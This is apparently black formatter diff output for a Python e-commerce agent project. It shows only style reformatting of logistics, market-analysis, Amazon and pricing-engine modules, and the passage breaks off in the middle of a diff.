-                "last_update": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+                "last_update": datetime.now(timezone.utc).strftime(
+                    "%Y-%m-%d %H:%M:%S UTC"
+                ),
             }
 
             tracking_tips = [
                 "Set up delivery notifications for important shipments",
                 "Use carrier-specific tracking for most accurate updates",
                 "Consider signature confirmation for high-value items",
-                "Track delivery performance metrics for carrier evaluation"
+                "Track delivery performance metrics for carrier evaluation",
             ]
 
             return {
                 "request_type": "tracking",
                 "tracking_info": tracking_info,
                 "tracking_tips": tracking_tips,
                 "confidence": 0.9,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
         except Exception as e:
             logger.error(f"Error in tracking request: {e}")
             return {
                 "request_type": "tracking",
                 "error": str(e),
                 "confidence": 0.1,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
     async def _handle_optimization_request(
-        self,
-        message: str,
-        logistics_info: Dict[str, Any],
-        context: Dict[str, Any]
+        self, message: str, logistics_info: Dict[str, Any], context: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Handle logistics optimization requests."""
         try:
             optimization_areas = [
                 {
                     "area": "Shipping Costs",
                     "potential_savings": "15-25%",
-                    "strategies": ["Negotiate carrier rates", "Optimize packaging", "Zone skipping"]
+                    "strategies": [
+                        "Negotiate carrier rates",
+                        "Optimize packaging",
+                        "Zone skipping",
+                    ],
                 },
                 {
                     "area": "Delivery Speed",
                     "potential_improvement": "20-30%",
-                    "strategies": ["Strategic warehouse placement", "Carrier diversification", "Local fulfillment"]
+                    "strategies": [
+                        "Strategic warehouse placement",
+                        "Carrier diversification",
+                        "Local fulfillment",
+                    ],
                 },
                 {
                     "area": "Inventory Efficiency",
                     "potential_improvement": "10-20%",
-                    "strategies": ["Demand forecasting", "ABC analysis", "Automated reordering"]
-                }
+                    "strategies": [
+                        "Demand forecasting",
+                        "ABC analysis",
+                        "Automated reordering",
+                    ],
+                },
             ]
 
             return {
                 "request_type": "optimization",
                 "optimization_areas": optimization_areas,
                 "confidence": 0.85,
-                "requires_approval": True  # Optimization changes may need approval
+                "requires_approval": True,  # Optimization changes may need approval
             }
 
         except Exception as e:
             logger.error(f"Error in optimization request: {e}")
             return {
                 "request_type": "optimization",
                 "error": str(e),
                 "confidence": 0.1,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
     async def _handle_general_logistics_query(
-        self,
-        message: str,
-        context: Dict[str, Any]
+        self, message: str, context: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Handle general logistics-related queries."""
         try:
             services = [
                 "Shipping: Rate calculation and carrier optimization",
                 "Inventory: Stock management and rebalancing strategies",
                 "Tracking: Shipment monitoring and delivery updates",
-                "Optimization: Cost reduction and efficiency improvements"
+                "Optimization: Cost reduction and efficiency improvements",
             ]
 
             return {
                 "request_type": "general",
                 "available_services": services,
                 "confidence": 0.7,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
         except Exception as e:
             logger.error(f"Error in general logistics query: {e}")
             return {
                 "request_type": "general",
                 "error": str(e),
                 "confidence": 0.1,
-                "requires_approval": False
+                "requires_approval": False,
             }
 
     # LLM response generation and enhancement methods
 
-    async def _generate_logistics_response(self, message: str, response_data: Dict[str, Any], request_type: str) -> str:
+    async def _generate_logistics_response(
+        self, message: str, response_data: Dict[str, Any], request_type: str
+    ) -> str:
         """Generate LLM response with logistics context."""
         try:
             # Create a context-aware prompt
             context_prompt = f"Logistics Request Type: {request_type}\n"
             context_prompt += f"User Message: {message}\n\n"
@@ -556,11 +606,13 @@
                 context_prompt += f"Tracking Information:\n"
                 context_prompt += f" Tracking Number: {tracking['tracking_number']}\n"
                 context_prompt += f" Carrier: {tracking['carrier']}\n"
                 context_prompt += f" Status: {tracking['status']}\n"
                 context_prompt += f" Location: {tracking['location']}\n"
-                context_prompt += f" Estimated Delivery: {tracking['estimated_delivery']}\n\n"
+                context_prompt += (
+                    f" Estimated Delivery: {tracking['estimated_delivery']}\n\n"
+                )
 
             if response_data.get("recommendations"):
                 context_prompt += "Recommendations:\n"
                 for rec in response_data["recommendations"]:
                     context_prompt += f" {rec}\n"
@@ -569,25 +621,30 @@
             # Use the LLM client to generate a natural response
             system_prompt = """You are a logistics optimization expert helping with supply chain and fulfillment operations.
             Provide helpful, actionable advice based on the logistics analysis and recommendations provided.
             Be conversational but professional, and focus on practical implementation."""
 
-            if hasattr(self, 'llm_client') and self.llm_client:
+            if hasattr(self, "llm_client") and self.llm_client:
                 llm_response = await self.llm_client.generate_response(
-                    prompt=context_prompt,
-                    system_prompt=system_prompt
-                )
-                return llm_response.content if hasattr(llm_response, 'content') else str(llm_response)
+                    prompt=context_prompt, system_prompt=system_prompt
+                )
+                return (
+                    llm_response.content
+                    if hasattr(llm_response, "content")
+                    else str(llm_response)
+                )
             else:
                 # Fallback response
                 return self._create_fallback_response(request_type, response_data)
 
         except Exception as e:
             logger.error(f"Error generating logistics response: {e}")
             return self._create_fallback_response(request_type, response_data)
 
-    def _create_fallback_response(self, request_type: str, response_data: Dict[str, Any]) -> str:
+    def _create_fallback_response(
+        self, request_type: str, response_data: Dict[str, Any]
+    ) -> str:
         """Create a fallback response when LLM is unavailable."""
         if request_type == "shipping":
             return "I can help you optimize your shipping operations. I've analyzed available carrier options and can provide rate comparisons and delivery time estimates to help you choose the best shipping solution."
         elif request_type == "inventory":
             return "I've analyzed your inventory management needs and can provide rebalancing strategies, optimization tips, and recommendations for improving your stock management efficiency."
@@ -599,14 +656,11 @@
             return "I'm here to help with all your logistics needs including shipping optimization, inventory management, tracking, and supply chain efficiency. What specific logistics assistance can I provide?"
 
     # Enhancement methods for different response types
 
     async def _enhance_shipping_response(
-        self,
-        llm_response: str,
-        logistics_info: Dict[str, Any],
-        original_message: str
+        self, llm_response: str, logistics_info: Dict[str, Any], original_message: str
     ) -> str:
         """Enhance shipping-related responses."""
         try:
             enhanced_response = f"{llm_response}\n\n"
             enhanced_response += "**Shipping Optimization Tips:**\n\n"
@@ -614,33 +668,32 @@
             tips = [
                 "**Rate Shopping:** Compare rates across multiple carriers for each shipment",
                 "**Packaging:** Optimize box sizes to reduce dimensional weight charges",
                 "**Volume Discounts:** Negotiate better rates based on shipping volume",
                 "**Zone Skipping:** Use regional carriers for local deliveries",
-                "**Delivery Speed:** Balance cost vs. speed based on customer expectations"
+                "**Delivery Speed:** Balance cost vs. speed based on customer expectations",
             ]
 
             for tip in tips:
                 enhanced_response += f" {tip}\n"
 
             enhanced_response += "\n**Carrier Recommendations:**\n"
             enhanced_response += " **USPS:** Best for small, lightweight packages\n"
             enhanced_response += " **FedEx:** Reliable for time-sensitive shipments\n"
             enhanced_response += " **UPS:** Good for business-to-business deliveries\n"
-            enhanced_response += " **Regional Carriers:** Cost-effective for local zones\n"
+            enhanced_response += (
+                " **Regional Carriers:** Cost-effective for local zones\n"
+            )
 
             return enhanced_response
 
         except Exception as e:
             logger.error(f"Error enhancing shipping response: {e}")
             return llm_response
 
     async def _enhance_inventory_response(
-        self,
-        llm_response: str,
-        logistics_info: Dict[str, Any],
-        original_message: str
+        self, llm_response: str, logistics_info: Dict[str, Any], original_message: str
     ) -> str:
         """Enhance inventory management responses."""
         try:
             enhanced_response = f"{llm_response}\n\n"
             enhanced_response += "**Inventory Management Best Practices:**\n\n"
@@ -648,33 +701,32 @@
             practices = [
                 "**ABC Analysis:** Categorize inventory by value and turnover rate",
                 "**Safety Stock:** Maintain buffer inventory for demand variability",
                 "**Reorder Points:** Set automated triggers for replenishment",
                 "**Demand Forecasting:** Use historical data for future planning",
-                "**Cycle Counting:** Regular inventory audits for accuracy"
+                "**Cycle Counting:** Regular inventory audits for accuracy",
             ]
 
             for practice in practices:
                 enhanced_response += f" {practice}\n"
 
             enhanced_response += "\n**Rebalancing Strategies:**\n"
             enhanced_response += " Move slow-moving items to lower-cost storage\n"
-            enhanced_response += " Distribute fast-moving items across multiple locations\n"
+            enhanced_response += (
+                " Distribute fast-moving items across multiple locations\n"
+            )
             enhanced_response += " Use cross-docking for high-velocity products\n"
             enhanced_response += " Implement just-in-time for predictable demand\n"
 
             return enhanced_response
 
         except Exception as e:
             logger.error(f"Error enhancing inventory response: {e}")
             return llm_response
 
     async def _enhance_tracking_response(
-        self,
-        llm_response: str,
-        logistics_info: Dict[str, Any],
-        original_message: str
+        self, llm_response: str, logistics_info: Dict[str, Any], original_message: str
     ) -> str:
         """Enhance tracking and delivery responses."""
         try:
             enhanced_response = f"{llm_response}\n\n"
             enhanced_response += "**Tracking Management Tips:**\n\n"
@@ -682,33 +734,34 @@
             tips = [
                 "**Proactive Notifications:** Set up alerts for delivery exceptions",
                 "**Customer Communication:** Provide tracking numbers immediately",
                 "**Delivery Confirmation:** Use signature or photo confirmation",
                 "**Performance Monitoring:** Track carrier delivery performance",
-                "**Exception Handling:** Have processes for failed deliveries"
+                "**Exception Handling:** Have processes for failed deliveries",
             ]
 
             for tip in tips:
                 enhanced_response += f" {tip}\n"
 
             enhanced_response += "\n**Common Tracking Statuses:**\n"
-            enhanced_response += " **In Transit:** Package is moving through carrier network\n"
-            enhanced_response += " **Out for Delivery:** Package is on delivery truck\n"
+            enhanced_response += (
+                " **In Transit:** Package is moving through carrier network\n"
+            )
+            enhanced_response += (
+                " **Out for Delivery:** Package is on delivery truck\n"
+            )
             enhanced_response += " **Delivered:** Package has been delivered\n"
             enhanced_response += " **Exception:** Delivery issue requiring attention\n"
 
             return enhanced_response
 
         except Exception as e:
             logger.error(f"Error enhancing tracking response: {e}")
             return llm_response
 
     async def _enhance_optimization_response(
-        self,
-        llm_response: str,
-        logistics_info: Dict[str, Any],
-        original_message: str
+        self, llm_response: str, logistics_info: Dict[str, Any], original_message: str
     ) -> str:
         """Enhance logistics optimization responses."""
         try:
             enhanced_response = f"{llm_response}\n\n"
             enhanced_response += "**Logistics Optimization Framework:**\n\n"
@@ -716,37 +769,51 @@
             framework = [
                 "**Cost Analysis:** Identify all logistics-related expenses",
                 "**Performance Metrics:** Track KPIs like delivery time and accuracy",
                 "**Process Mapping:** Document current logistics workflows",
                 "**Technology Integration:** Leverage automation and AI",
-                "**Continuous Improvement:** Regular review and optimization"
+                "**Continuous Improvement:** Regular review and optimization",
             ]
 
             for item in framework:
                 enhanced_response += f" {item}\n"
 
             enhanced_response += "\n**Key Optimization Areas:**\n"
-            enhanced_response += " **Transportation:** Route optimization and carrier selection\n"
-            enhanced_response += " **Warehousing:** Layout optimization and automation\n"
-            enhanced_response += " **Inventory:** Stock level optimization and forecasting\n"
+            enhanced_response += (
+                " **Transportation:** Route optimization and carrier selection\n"
+            )
+            enhanced_response += (
+                " **Warehousing:** Layout optimization and automation\n"
+            )
+            enhanced_response += (
+                " **Inventory:** Stock level optimization and forecasting\n"
+            )
             enhanced_response += " **Technology:** WMS, TMS, and integration systems\n"
 
             return enhanced_response
 
         except Exception as e:
             logger.error(f"Error enhancing optimization response: {e}")
             return llm_response
 
-    async def _enhance_general_response(self, llm_response: str, original_message: str) -> str:
+    async def _enhance_general_response(
+        self, llm_response: str, original_message: str
+    ) -> str:
         """Enhance general logistics responses."""
         try:
             enhanced_response = f"{llm_response}\n\n"
             enhanced_response += "**Logistics Services Available:**\n"
             enhanced_response += " **Shipping:** Rate calculation, carrier selection, and optimization\n"
-            enhanced_response += " **Inventory:** Stock management, rebalancing, and forecasting\n"
-            enhanced_response += " **Tracking:** Shipment monitoring and delivery management\n"
-            enhanced_response += " **Optimization:** Cost reduction and efficiency improvements\n\n"
+            enhanced_response += (
+                " **Inventory:** Stock management, rebalancing, and forecasting\n"
+            )
+            enhanced_response += (
+                " **Tracking:** Shipment monitoring and delivery management\n"
+            )
+            enhanced_response += (
+                " **Optimization:** Cost reduction and efficiency improvements\n\n"
+            )
             enhanced_response += "*Ask me about shipping rates, inventory management, tracking shipments, or logistics optimization!*"
 
             return enhanced_response
 
         except Exception as e:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/logistics_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_market_analyzer.py	2025-06-16 06:54:25.983748+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_market_analyzer.py	2025-06-19 04:03:41.251745+00:00
@@ -10,19 +10,23 @@
 from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass
 import numpy as np
 import pandas as pd
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
 class MarketMetrics:
     """Market metrics data structure."""
+
     category: str
     market_size: float
     growth_rate: float
     competition_level: str  # "low", "medium", "high"
     demand_score: float  # 0-100
@@ -34,10 +38,11 @@
 
 
 @dataclass
 class MarketOpportunity:
     """Market opportunity structure."""
+
     opportunity_id: str
     category: str
     opportunity_type: str  # "underserved_niche", "price_gap", "seasonal_demand", etc.
     description: str
     potential_revenue: float
@@ -50,98 +55,100 @@
 
 
 class EnhancedMarketAnalyzer(BaseConversationalAgent):
     """
     Enhanced market analyzer using available dependencies.
-    
+
     Capabilities:
     - Comprehensive market analysis
     - Demand and supply assessment
     - Opportunity identification
     - Market sizing and growth analysis
     - Competitive landscape evaluation
     """
-    
-    def __init__(self, agent_id: str = "enhanced_market_analyzer", use_fast_model: bool = True):
+
+    def __init__(
+        self, agent_id: str = "enhanced_market_analyzer", use_fast_model: bool = True
+    ):
         """Initialize the enhanced market analyzer."""
         super().__init__(
             agent_role=AgentRole.MARKET,
             agent_id=agent_id,
-            use_fast_model=use_fast_model
+            use_fast_model=use_fast_model,
         )
-        
+
         # Market data storage
         self.market_metrics: Dict[str, MarketMetrics] = {}
         self.market_opportunities: List[MarketOpportunity] = []
         self.market_history: Dict[str, List[Dict]] = {}
-        
+
         # Analysis parameters
         self.opportunity_threshold = 70.0  # Minimum opportunity score
         self.competition_thresholds = {"low": 30, "medium": 70, "high": 100}
-        
+
         logger.info(f"EnhancedMarketAnalyzer initialized: {self.agent_id}")
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get agent-specific context for prompt generation."""
         return {
             "agent_type": "enhanced_market_analyzer",
             "capabilities": [
                 "Comprehensive market analysis",
                 "Demand and supply assessment",
                 "Opportunity identification",
                 "Market sizing and growth analysis",
-                "Competitive landscape evaluation"
+                "Competitive landscape evaluation",
             ],
             "analyzed_markets": len(self.market_metrics),
-            "identified_opportunities": len(self.market_opportunities)
+            "identified_opportunities": len(self.market_opportunities),
         }
-    
+
     async def analyze_market(self, category: str, region: str = "US") -> MarketMetrics:
         """Perform comprehensive market analysis for a category."""
         try:
             # Generate market data (in production, this would use real market APIs)
             market_data = await self._gather_market_data(category, region)
-            
+
             # Analyze market metrics
             metrics = await self._calculate_market_metrics(category, market_data)
-            
+
             # Store metrics
             self.market_metrics[category] = metrics
-            
+
             # Identify opportunities
             await self._identify_market_opportunities(category, metrics, market_data)
-            
+
             return metrics
-            
+
         except Exception as e:
             logger.error(f"Error analyzing market: {e}")
             raise
-    
+
     async def _gather_market_data(self, category: str, region: str) -> Dict[str, Any]:
         """Gather market data for analysis."""
         # Mock market data generation (in production, would use real APIs)
-        
+
         # Base market size by category
         base_sizes = {
             "electronics": 500000000,  # $500M
-            "clothing": 300000000,     # $300M
-            "home": 200000000,         # $200M
-            "toys": 100000000,         # $100M
-            "books": 50000000,         # $50M
+            "clothing": 300000000,  # $300M
+            "home": 200000000,  # $200M
+            "toys": 100000000,  # $100M
+            "books": 50000000,  # $50M
         }
-        
+
         # Determine category
         market_size = base_sizes.get("electronics", 100000000)  # Default
         for cat, size in base_sizes.items():
             if cat in category.lower():
                 market_size = size
                 break
-        
+
         # Add regional variations
         regional_multipliers = {"US": 1.0, "EU": 0.8, "ASIA": 1.2}
         market_size *= regional_multipliers.get(region, 1.0)
-        
+
         # Generate realistic market data
         return {
             "market_size": market_size,
             "growth_rate": np.random.uniform(0.05, 0.25),  # 5-25% growth
             "competitor_count": np.random.randint(50, 500),
@@ -149,141 +156,152 @@
             "search_volume": np.random.randint(10000, 100000),
             "seasonal_factor": np.random.uniform(0.8, 1.3),
             "barrier_to_entry": np.random.uniform(0.2, 0.8),
             "profit_margin": np.random.uniform(0.15, 0.45),
             "customer_satisfaction": np.random.uniform(3.5, 4.8),
-            "market_maturity": np.random.uniform(0.3, 0.9)
+            "market_maturity": np.random.uniform(0.3, 0.9),
         }
-    
-    async def _calculate_market_metrics(self, category: str, data: Dict[str, Any]) -> MarketMetrics:
+
+    async def _calculate_market_metrics(
+        self, category: str, data: Dict[str, Any]
+    ) -> MarketMetrics:
         """Calculate comprehensive market metrics."""
-        
+
         # Calculate demand score (0-100)
         demand_factors = [
             data["search_volume"] / 1000,  # Normalize search volume
-            data["growth_rate"] * 100,     # Growth rate as percentage
+            data["growth_rate"] * 100,  # Growth rate as percentage
             data["seasonal_factor"] * 20,  # Seasonal boost
-            (5 - data["customer_satisfaction"]) * -10  # Satisfaction penalty
+            (5 - data["customer_satisfaction"]) * -10,  # Satisfaction penalty
         ]
         demand_score = min(100, max(0, sum(demand_factors) / len(demand_factors)))
-        
+
         # Calculate supply score (0-100) - higher = more saturated
         supply_factors = [
             data["competitor_count"] / 10,  # Competitor density
             data["market_maturity"] * 100,  # Market maturity
-            (1 - data["barrier_to_entry"]) * 50  # Ease of entry
+            (1 - data["barrier_to_entry"]) * 50,  # Ease of entry
         ]
         supply_score = min(100, max(0, sum(supply_factors) / len(supply_factors)))
-        
+
         # Calculate opportunity score (demand high, supply manageable)
         opportunity_score = demand_score * 0.6 + (100 - supply_score) * 0.4
-        
+
         # Determine competition level
         if supply_score < self.competition_thresholds["low"]:
             competition_level = "low"
         elif supply_score < self.competition_thresholds["medium"]:
             competition_level = "medium"
         else:
             competition_level = "high"
-        
+
         # Determine entry barrier
         if data["barrier_to_entry"] < 0.3:
             entry_barrier = "low"
         elif data["barrier_to_entry"] < 0.6:
             entry_barrier = "medium"
         else:
             entry_barrier = "high"
-        
+
         # Determine profit potential
         if data["profit_margin"] > 0.3 and opportunity_score > 70:
             profit_potential = "high"
         elif data["profit_margin"] > 0.2 and opportunity_score > 50:
             profit_potential = "medium"
         else:
             profit_potential = "low"
-        
+
         return MarketMetrics(
             category=category,
             market_size=data["market_size"],
             growth_rate=data["growth_rate"],
             competition_level=competition_level,
             demand_score=round(demand_score, 1),
             supply_score=round(supply_score, 1),
             opportunity_score=round(opportunity_score, 1),
             entry_barrier=entry_barrier,
             profit_potential=profit_potential,
-            analysis_date=datetime.now(timezone.utc)
+            analysis_date=datetime.now(timezone.utc),
         )
-    
+
     async def _identify_market_opportunities(
-        self, 
-        category: str, 
-        metrics: MarketMetrics, 
-        data: Dict[str, Any]
+        self, category: str, metrics: MarketMetrics, data: Dict[str, Any]
     ):
         """Identify specific market opportunities."""
         opportunities = []
-        
+
         # High opportunity score = general opportunity
         if metrics.opportunity_score >= self.opportunity_threshold:
-            opportunities.append(MarketOpportunity(
-                opportunity_id=f"general_{category}_{datetime.now().timestamp()}",
-                category=category,
-                opportunity_type="high_demand_low_competition",
-                description=f"Strong market opportunity in {category} with {metrics.opportunity_score:.1f}/100 score",
-                potential_revenue=metrics.market_size * 0.01,  # 1% market share
-                investment_required=metrics.market_size * 0.001,  # 0.1% of market size
-                roi_estimate=data["profit_margin"] * 100,
-                risk_level=metrics.entry_barrier,
-                time_to_market=30 if metrics.entry_barrier == "low" else 90,
-                confidence=0.8,
-                identified_at=datetime.now(timezone.utc)
-            ))
-        
+            opportunities.append(
+                MarketOpportunity(
+                    opportunity_id=f"general_{category}_{datetime.now().timestamp()}",
+                    category=category,
+                    opportunity_type="high_demand_low_competition",
+                    description=f"Strong market opportunity in {category} with {metrics.opportunity_score:.1f}/100 score",
+                    potential_revenue=metrics.market_size * 0.01,  # 1% market share
+                    investment_required=metrics.market_size
+                    * 0.001,  # 0.1% of market size
+                    roi_estimate=data["profit_margin"] * 100,
+                    risk_level=metrics.entry_barrier,
+                    time_to_market=30 if metrics.entry_barrier == "low" else 90,
+                    confidence=0.8,
+                    identified_at=datetime.now(timezone.utc),
+                )
+            )
+
         # Price gap opportunity
         if data["profit_margin"] > 0.35:
-            opportunities.append(MarketOpportunity(
-                opportunity_id=f"price_gap_{category}_{datetime.now().timestamp()}",
-                category=category,
-                opportunity_type="price_gap",
-                description=f"High profit margin opportunity ({data['profit_margin']:.1%}) in {category}",
-                potential_revenue=metrics.market_size * 0.005,
-                investment_required=metrics.market_size * 0.0005,
-                roi_estimate=data["profit_margin"] * 120,  # Enhanced ROI for price gaps
-                risk_level="medium",
-                time_to_market=14,
-                confidence=0.7,
-                identified_at=datetime.now(timezone.utc)
-            ))
-        
+            opportunities.append(
+                MarketOpportunity(
+                    opportunity_id=f"price_gap_{category}_{datetime.now().timestamp()}",
+                    category=category,
+                    opportunity_type="price_gap",
+                    description=f"High profit margin opportunity ({data['profit_margin']:.1%}) in {category}",
+                    potential_revenue=metrics.market_size * 0.005,
+                    investment_required=metrics.market_size * 0.0005,
+                    roi_estimate=data["profit_margin"]
+                    * 120,  # Enhanced ROI for price gaps
+                    risk_level="medium",
+                    time_to_market=14,
+                    confidence=0.7,
+                    identified_at=datetime.now(timezone.utc),
+                )
+            )
+
         # Seasonal opportunity
         if data["seasonal_factor"] > 1.2:
-            opportunities.append(MarketOpportunity(
-                opportunity_id=f"seasonal_{category}_{datetime.now().timestamp()}",
-                category=category,
-                opportunity_type="seasonal_demand",
-                description=f"Seasonal demand spike ({data['seasonal_factor']:.1f}x) in {category}",
-                potential_revenue=metrics.market_size * 0.02 * data["seasonal_factor"],
-                investment_required=metrics.market_size * 0.002,
-                roi_estimate=data["profit_margin"] * data["seasonal_factor"] * 100,
-                risk_level="low",
-                time_to_market=7,
-                confidence=0.9,
-                identified_at=datetime.now(timezone.utc)
-            ))
-        
+            opportunities.append(
+                MarketOpportunity(
+                    opportunity_id=f"seasonal_{category}_{datetime.now().timestamp()}",
+                    category=category,
+                    opportunity_type="seasonal_demand",
+                    description=f"Seasonal demand spike ({data['seasonal_factor']:.1f}x) in {category}",
+                    potential_revenue=metrics.market_size
+                    * 0.02
+                    * data["seasonal_factor"],
+                    investment_required=metrics.market_size * 0.002,
+                    roi_estimate=data["profit_margin"] * data["seasonal_factor"] * 100,
+                    risk_level="low",
+                    time_to_market=7,
+                    confidence=0.9,
+                    identified_at=datetime.now(timezone.utc),
+                )
+            )
+
         self.market_opportunities.extend(opportunities)
-    
+
     async def get_market_recommendations(self, category: str) -> List[str]:
         """Generate AI-powered market recommendations."""
         try:
             if category not in self.market_metrics:
                 await self.analyze_market(category)
-            
+
             metrics = self.market_metrics[category]
-            opportunities = [op for op in self.market_opportunities if op.category == category]
-            
+            opportunities = [
+                op for op in self.market_opportunities if op.category == category
+            ]
+
             prompt = f"""
             Based on this market analysis, provide specific recommendations:
             
             Market: {category}
             Market Size: ${metrics.market_size:,.0f}
@@ -297,46 +315,47 @@
             
             Identified Opportunities: {len(opportunities)}
             
             Provide 5 specific, actionable recommendations for entering or optimizing in this market.
             """
-            
+
             response = await self.llm_client.generate_response(
                 prompt=prompt,
-                system_prompt="You are a market analysis expert. Provide specific, actionable market recommendations."
-            )
-            
+                system_prompt="You are a market analysis expert. Provide specific, actionable market recommendations.",
+            )
+
             # Parse recommendations
             recommendations = [
-                line.strip().lstrip('- ').lstrip(' ')
-                for line in response.content.split('\n')
-                if line.strip() and not line.strip().startswith('Based on')
+                line.strip().lstrip("- ").lstrip(" ")
+                for line in response.content.split("\n")
+                if line.strip() and not line.strip().startswith("Based on")
             ][:5]
-            
-            return recommendations if recommendations else [
-                "Analyze competitor pricing strategies",
-                "Identify underserved customer segments",
-                "Optimize product positioning",
-                "Develop seasonal marketing campaigns",
-                "Monitor market trends regularly"
-            ]
-            
+
+            return (
+                recommendations
+                if recommendations
+                else [
+                    "Analyze competitor pricing strategies",
+                    "Identify underserved customer segments",
+                    "Optimize product positioning",
+                    "Develop seasonal marketing campaigns",
+                    "Monitor market trends regularly",
+                ]
+            )
+
         except Exception as e:
             logger.error(f"Error generating recommendations: {e}")
             return ["Conduct thorough market research", "Analyze competitive landscape"]
-    
+
     async def _process_response(self, response: Any) -> str:
         """Process and format the response."""
-        if hasattr(response, 'content'):
+        if hasattr(response, "content"):
             return response.content
         return str(response)
-    
+
     async def handle_message(
-        self, 
-        message: str, 
-        conversation_id: str, 
-        user_id: str
+        self, message: str, conversation_id: str, user_id: str
     ) -> AgentResponse:
         """Handle market analysis queries."""
         try:
             system_prompt = """You are FlipSync's Enhanced Market Analyzer, an expert in comprehensive market analysis and opportunity identification.
 
@@ -348,29 +367,32 @@
 - Competitive landscape evaluation
 
 Provide specific, data-driven market insights and actionable recommendations for marketplace success."""
 
             response = await self.llm_client.generate_response(
-                prompt=message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type="enhanced_market_analyzer",
                 confidence=0.9,
                 response_time=response.response_time,
                 metadata={
                     "analyzed_markets": len(self.market_metrics),
                     "identified_opportunities": len(self.market_opportunities),
-                    "analysis_capabilities": ["market_sizing", "opportunity_identification", "competitive_analysis"]
-                }
-            )
-            
+                    "analysis_capabilities": [
+                        "market_sizing",
+                        "opportunity_identification",
+                        "competitive_analysis",
+                    ],
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error handling message: {e}")
             return AgentResponse(
                 content="I'm having trouble processing your market analysis request right now. Please try again.",
                 agent_type="enhanced_market_analyzer",
                 confidence=0.1,
-                response_time=0.0
-            )
+                response_time=0.0,
+            )
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/amazon_agent.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/amazon_agent.py	2025-06-19 04:03:41.249465+00:00
@@ -624,6 +624,5 @@
         # Use inherited method
         response = await self.get_with_retry(endpoint, params=params)
         self.metrics["products_fetched"] += 1
         # Add more granular metrics if needed
         return response
-
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_market_analyzer.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/amazon_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/pricing_engine.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/pricing_engine.py	2025-06-19 04:03:41.289963+00:00
@@ -12,21 +12,28 @@
 from decimal import Decimal, ROUND_HALF_UP
 from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass
 
 from fs_agt_clean.core.models.marketplace_models import (
-    Price, PricingRecommendation, CompetitorAnalysis, CompetitorListing,
-    ProductIdentifier, PriceChangeDirection, MarketMetrics,
-    calculate_price_change_percentage, get_price_position
+    Price,
+    PricingRecommendation,
+    CompetitorAnalysis,
+    CompetitorListing,
+    ProductIdentifier,
+    PriceChangeDirection,
+    MarketMetrics,
+    calculate_price_change_percentage,
+    get_price_position,
 )
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
 class PricingStrategy:
     """Pricing strategy configuration."""
+
     strategy_type: str  # "competitive", "premium", "value", "penetration"
     target_margin: float  # Target profit margin (0.0 to 1.0)
     max_price_change: float  # Maximum price change percentage
     min_price_threshold: Decimal  # Minimum acceptable price
     max_price_threshold: Decimal  # Maximum acceptable price
@@ -36,138 +43,139 @@
 
 
 @dataclass
 class MarketConditions:
     """Current market conditions affecting pricing."""
+
     demand_level: str  # "low", "medium", "high"
     competition_intensity: str  # "low", "medium", "high"
     seasonality_factor: float  # Seasonal adjustment factor
     trend_direction: str  # "increasing", "decreasing", "stable"
     market_volatility: float  # Price volatility measure
     inventory_pressure: str  # "low", "medium", "high"
 
 
 class PricingEngine:
     """Advanced pricing analysis and recommendation engine."""
-    
+
     def __init__(self):
         """Initialize the pricing engine."""
         self.default_strategy = PricingStrategy(
             strategy_type="competitive",
             target_margin=0.25,
             max_price_change=0.15,  # 15% max change
             min_price_threshold=Decimal("5.00"),
             max_price_threshold=Decimal("1000.00"),
             competitor_weight=0.6,
             market_weight=0.3,
-            cost_weight=0.1
-        )
-        
+            cost_weight=0.1,
+        )
+
         logger.info("Pricing engine initialized")
-    
+
     async def analyze_pricing(
         self,
         product_id: ProductIdentifier,
         current_price: Price,
         competitor_prices: List[Price],
         market_metrics: Optional[MarketMetrics] = None,
         strategy: Optional[PricingStrategy] = None,
-        cost_data: Optional[Dict[str, Any]] = None
+        cost_data: Optional[Dict[str, Any]] = None,
     ) -> PricingRecommendation:
         """
         Perform comprehensive pricing analysis and generate recommendations.
-        
+
         Args:
             product_id: Product identifier
             current_price: Current product price
             competitor_prices: List of competitor prices
             market_metrics: Market performance metrics
             strategy: Pricing strategy to use
             cost_data: Product cost information
-            
+
         Returns:
             PricingRecommendation with analysis and suggested price
         """
         try:
             # Use default strategy if none provided
             if strategy is None:
                 strategy = self.default_strategy
-            
+
             # Analyze market conditions
             market_conditions = self._analyze_market_conditions(
                 competitor_prices, market_metrics
             )
-            
+
             # Calculate competitive analysis
             competitive_analysis = self._analyze_competitors(
                 current_price, competitor_prices
             )
-            
+
             # Generate price recommendation
             recommended_price = self._calculate_recommended_price(
-                current_price, competitor_prices, market_conditions, 
-                strategy, cost_data
-            )
-            
+                current_price, competitor_prices, market_conditions, strategy, cost_data
+            )
+
             # Determine price change direction
             price_change_direction = self._determine_price_direction(
                 current_price, recommended_price
             )
-            
+
             # Calculate confidence score
             confidence_score = self._calculate_confidence_score(
